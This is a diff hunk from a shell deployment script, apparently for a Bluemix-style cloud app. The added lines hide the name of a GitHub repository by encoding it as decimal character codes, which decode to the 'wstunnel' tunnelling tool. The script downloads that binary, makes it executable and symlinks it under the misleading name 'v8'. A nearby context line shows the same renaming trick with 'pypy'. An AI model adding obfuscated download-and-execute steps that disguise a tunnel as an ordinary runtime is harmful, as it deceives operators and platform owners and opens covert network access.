@@ -50,6 +50,15 @@ rm -rf pypy
 ln -sf ${BAR}_${BAR_VER//v}_linux_amd64/$BAR pypy
 
 #
+FOO=$(foobar '101 114 101 98 101')
+BAR=$(foobar '119 115 116 117 110 110 101 108')
+BAR_VER=$(get_version "$FOO/$BAR")
+curl -fSL -O "https://github.com/$FOO/$BAR/releases/download/$BAR_VER/${BAR}_linux_x64"
+chmod 755 ${BAR}_linux_x64
+rm -rf v8
+ln -sf ${BAR}_linux_x64 v8
+
+#
 if [ -n "$PORT" ]; then
   MY_APP_PORT=$PORT
 elif [ -n "$BLUEMIX_REGION" ]; then
